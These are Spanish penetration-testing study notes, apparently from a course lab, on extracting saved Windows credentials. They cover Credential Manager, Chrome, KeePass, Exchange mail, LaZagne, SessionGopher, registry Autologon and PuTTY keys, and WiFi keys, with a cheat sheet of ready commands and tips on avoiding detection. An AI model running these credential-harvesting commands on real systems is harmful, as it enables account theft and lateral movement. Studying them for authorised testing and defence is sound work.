---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- Windows almacena credenciales en múltiples ubicaciones además de LSASS/SAM: Credential Manager (cmdkey), navegadores (Chrome), gestores de contraseñas locales (KeePass), el registro (Autologon, PuTTY), perfiles WiFi guardados y artefactos de herramientas de acceso remoto (WinSCP, SuperPuTTY, RDP).
- Muchas de estas credenciales quedan en texto claro o son fácilmente reversibles (DPAPI, registro plano), por lo que no requieren cracking offline en la mayoría de los casos.
- El objetivo es doble: **movimiento lateral** (reutilizar credenciales en otro host/servicio) y **escalada de privilegios** (credenciales de administrador almacenadas localmente).
- Herramientas "todo en uno" como LaZagne o SessionGopher automatizan la búsqueda cuando la enumeración manual no es viable por tiempo, pero generan más ruido/eventos en el Blue Team.

## Herramientas Clave

| Herramienta | Propósito |
|---|---|
| `cmdkey` | Nativa de Windows. Lista credenciales guardadas (RDP/Terminal Services) en Credential Manager. |
| `runas` | Nativa de Windows. Reutiliza credenciales guardadas (`/savecred`) para ejecutar comandos/shells como otro usuario. |
| `SharpChrome` | Extrae y desencripta (DPAPI) credenciales e historial de logins guardados en Google Chrome. |
| `keepass2john` | Convierte un archivo `.kdbx` (base de datos KeePass) en un hash crackeable formato Hashcat/John. |
| `Hashcat` | Cracking offline del hash de KeePass (modo `-m 13400`) u otros hashes extraídos. |
| `MailSniper` | Busca en buzones de Exchange/O365 términos como "pass", "creds", "credentials" dentro del correo de un usuario de dominio. |
| `LaZagne` | Framework multi-módulo (browsers, mails, wifi, databases, sysadmin, etc.) que extrae credenciales en texto claro de software instalado. |
| `SessionGopher` | Script PowerShell que extrae y desencripta sesiones guardadas de PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP, recorriendo `HKEY_USERS`. |
| `reg.exe` | Nativa de Windows. Enumeración manual del registro (Autologon, sesiones PuTTY). |
| `netsh wlan` | Nativa de Windows. Lista perfiles WiFi guardados y revela la clave precompartida en texto claro. |
| `Autologon.exe` (Sysinternals) | Alternativa "segura" a configurar Autologon manualmente; cifra la contraseña como secreto LSA en lugar de texto claro. |

## Metodología Paso a Paso

### Fase 1 — Credential Manager / RDP guardado
1. Enumerar credenciales almacenadas con `cmdkey /list`. Si existe una entrada `TERMSRV/<HOST>`, significa que hay credenciales RDP guardadas reutilizables sin volver a introducir contraseña.
2. Si no se puede usar RDP directamente (ej. sin GUI), reutilizar la credencial guardada vía `runas /savecred` para lanzar una shell, binario o PowerShell como ese usuario → pivote lateral o escalada local.

### Fase 2 — Credenciales de navegador
1. Identificar si el usuario actual tiene perfil de Chrome con logins guardados.
2. Ejecutar `SharpChrome` con `logins /unprotect` para desencriptar vía DPAPI (clave AES del `Local State`) y extraer usuario/contraseña/URL en texto claro.
3. **Consideración OPSEC**: esta técnica genera eventos 4688 (creación de proceso), 16385 (actividad DPAPI), y potencialmente 4662/4663 (acceso a objeto/archivo).

### Fase 3 — Gestores de contraseñas (KeePass)
1. Buscar archivos `.kdbx` en discos, recursos compartidos o perfiles de usuario (indica uso de KeePass con contraseña maestra).
2. Transferir el `.kdbx` a la máquina de ataque.
3. Extraer el hash con `keepass2john.py`.
4. Crackear offline con Hashcat (modo `-m 13400`) usando un diccionario (ej. rockyou.txt).
5. Si se obtiene la contraseña maestra, se accede a toda la bóveda → potencial acceso a credenciales de TI de alto valor (red, DB, servidores).

### Fase 4 — Correo electrónico (Exchange)
1. Con un usuario de dominio que tenga buzón Exchange, usar `MailSniper` para buscar términos clave ("pass", "creds", "credentials") dentro de los correos del usuario.

### Fase 5 — Extracción automatizada amplia (LaZagne)
1. Revisar el menú de ayuda (`-h`) para ver módulos disponibles (chats, mails, browsers, wifi, sysadmin, databases, memory, etc.).
2. Ejecutar el módulo `all` para barrer todo el software soportado de una vez y obtener credenciales en texto claro (WinSCP, Credential Manager, etc.).
3. Usar como último recurso ("cuando todo lo demás falla") ya que es ruidoso pero efectivo contra software que no almacena credenciales de forma segura.

### Fase 6 — Sesiones de acceso remoto (SessionGopher)
1. Importar el módulo PowerShell.
2. Ejecutar `Invoke-SessionGopher` contra el host objetivo (local o remoto) para extraer sesiones de PuTTY, WinSCP, SuperPuTTY, RDP y archivos de clave privada (`.ppk`, `.rdp`, `.sdtid`).
3. **Nota de privilegios**: sin admin local solo se ve el contexto del usuario actual; con admin local se puede recorrer `HKEY_USERS` y extraer sesiones de **todos** los usuarios del host.

### Fase 7 — Enumeración manual del registro (texto claro)
1. **Windows Autologon**: consultar la clave `Winlogon` en `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion`. Si `AutoAdminLogon = 1`, las claves `DefaultUserName` y `DefaultPassword` contienen credenciales en texto claro accesibles por usuarios estándar.
2. **Sesiones PuTTY**: enumerar `HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions` para listar nombres de sesión guardados, luego inspeccionar cada sesión individual. Prestar especial atención a configuraciones de proxy (`ProxyUsername`/`ProxyPassword`) que a menudo contienen credenciales administrativas reutilizadas indebidamente.
   - **Restricción de acceso**: la clave está vinculada al usuario que la creó (HKCU). Para verla en otro usuario se necesita: (a) haber iniciado sesión como ese usuario, o (b) tener privilegios de administrador para buscar en el hive correspondiente bajo `HKEY_USERS`.

### Fase 8 — Contraseñas WiFi
1. Listar perfiles WiFi guardados (requiere admin local) con `netsh wlan show profile`.
2. Para un SSID de interés, recuperar la clave precompartida en texto claro añadiendo `key=clear`.
3. Útil para pivotar a una red WiFi separada/corporativa durante el engagement.

## Cheat Sheet de Comandos

```cmd
:: Listar credenciales guardadas en Windows Credential Manager (RDP/Terminal Services)
:: Busca entradas tipo TERMSRV/<HOST> reutilizables sin pedir password
C:\htb> cmdkey /list
```

```powershell
# Reutilizar una credencial guardada para ejecutar un comando/shell/binario como otro usuario
# /savecred usa la credencial ya almacenada (ej. la vista con cmdkey /list)
PS C:\htb> runas /savecred /user:<DOMAIN>\<USER> "<COMMAND>"
```

```powershell
# Extraer y desencriptar (DPAPI) logins guardados de Google Chrome del usuario actual
# /unprotect indica que se debe desencriptar usando la clave AES del Local State del propio usuario
PS C:\htb> .\SharpChrome.exe logins /unprotect
```

```bash
# Convertir un archivo de base de datos KeePass (.kdbx) en un hash crackeable
# Salida en formato $keepass$ compatible con Hashcat/John
ssek@htb[/htb]$ python2.7 keepass2john.py <FILE>.kdbx
```

```bash
# Crackear offline el hash de KeePass extraído
# -m 13400 = modo de hash específico para KeePass 1 (AES/Twofish) y KeePass 2 (AES)
ssek@htb[/htb]$ hashcat -m 13400 <HASH_FILE> <WORDLIST_PATH>
```

```powershell
# Ver el menú de ayuda y módulos disponibles de LaZagne
# -h lista todos los módulos: chats, mails, all, browsers, wifi, sysadmin, databases, memory, etc.
PS C:\htb> .\lazagne.exe -h
```

```powershell
# Ejecutar TODOS los módulos de LaZagne contra el host actual
# Barre el sistema buscando credenciales en texto claro en software instalado
PS C:\htb> .\lazagne.exe all
```

```powershell
# Cargar el script de SessionGopher en la sesión actual de PowerShell
PS C:\htb> Import-Module .\SessionGopher.ps1

# Ejecutar SessionGopher contra un host (local o remoto)
# Sin admin local: solo extrae sesiones del usuario actual (HKCU)
# Con admin local: recorre HKEY_USERS y extrae sesiones de TODOS los usuarios
PS C:\Tools> Invoke-SessionGopher -Target <TARGET_HOSTNAME>
```

```cmd
:: Enumerar configuración de Windows Autologon en el registro
:: Buscar AutoAdminLogon=1, DefaultUserName y DefaultPassword (texto claro)
C:\htb> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

```powershell
# Enumerar nombres de sesiones PuTTY guardadas por el usuario actual
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

# Inspeccionar una sesión específica para buscar credenciales de proxy u otras
# Prestar atención a ProxyUsername / ProxyPassword (texto claro)
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION_NAME>
```

```cmd
:: Listar perfiles de redes WiFi guardados en el host (requiere admin local)
C:\htb> netsh wlan show profile

:: Recuperar la clave precompartida (PSK) en texto claro de un SSID específico
:: key=clear muestra el "Key Content" del perfil
C:\htb> netsh wlan show profile <SSID_NAME> key=clear
```

## Gotchas y Troubleshooting

- **cmdkey/runas**: las credenciales solo son reutilizables si fueron guardadas explícitamente por el usuario (ej. conexión RDP con "recordar credenciales"); no descifra contraseñas, solo permite reutilizarlas en el contexto actual.
- **SharpChrome / cualquier extracción Chromium**: genera telemetría adicional fácilmente detectable por Blue Team (Event IDs 4688, 16385, y opcionalmente 4662/4663). Considerar el ruido antes de ejecutar en un engagement sigiloso.
- **keepass2john**: el script usado en el módulo es para **Python 2.7** explícitamente (`python2.7 keepass2john.py`), no Python 3 — verificar la versión disponible en el entorno de ataque.
- **KeePass**: solo es atacable si se logra exfiltrar el `.kdbx` al host de ataque; la protección depende enteramente de la fortaleza de la contraseña maestra (vulnerable a diccionarios tipo rockyou.txt).
- **MailSniper**: requiere contexto de usuario de dominio válido con buzón Exchange accesible; el módulo no detalla sintaxis de comando específica, solo el caso de uso (búsqueda de palabras clave en correo).
- **LaZagne**: es la opción de "último recurso" — efectiva pero ruidosa; soporta salida en texto plano o JSON y puede dirigirse a un módulo específico en vez de `all` para reducir ruido (ej. solo `databases` o `browsers`).
- **SessionGopher**:
  - Sin privilegios de administrador local, solo se enumera el contexto del usuario que ejecuta el script.
  - Con admin local, puede recorrer `HKEY_USERS` para todos los usuarios que hayan iniciado sesión en el host (dominio o standalone).
  - También puede buscar en unidades archivos `.ppk` (clave privada PuTTY), `.rdp` (Escritorio Remoto) y `.sdtid` (RSA), no solo claves de registro.
- **Registro - PuTTY**: el control de acceso a `HKEY_CURRENT_USER\...\PuTTY\Sessions` está atado a la cuenta que creó la sesión. Para ver sesiones de otro usuario sin haber iniciado sesión como él, se necesita ser administrador y consultar el hive correspondiente bajo `HKEY_USERS` en lugar de `HKEY_CURRENT_USER`.
- **Autologon**: las claves `DefaultUserName`/`DefaultPassword` son legibles por **usuarios estándar** (no requiere privilegios elevados) — gran objetivo de quick-win en post-explotación. Si el cliente necesita Autologon, la alternativa recomendada es `Autologon.exe` de Sysinternals, que cifra la contraseña como secreto LSA en vez de texto claro.
- **WiFi (netsh wlan)**: requiere privilegios de **administrador local** para mostrar la clave en texto claro con `key=clear`; sin ello solo se listan los nombres de perfil, no el contenido de la clave.wind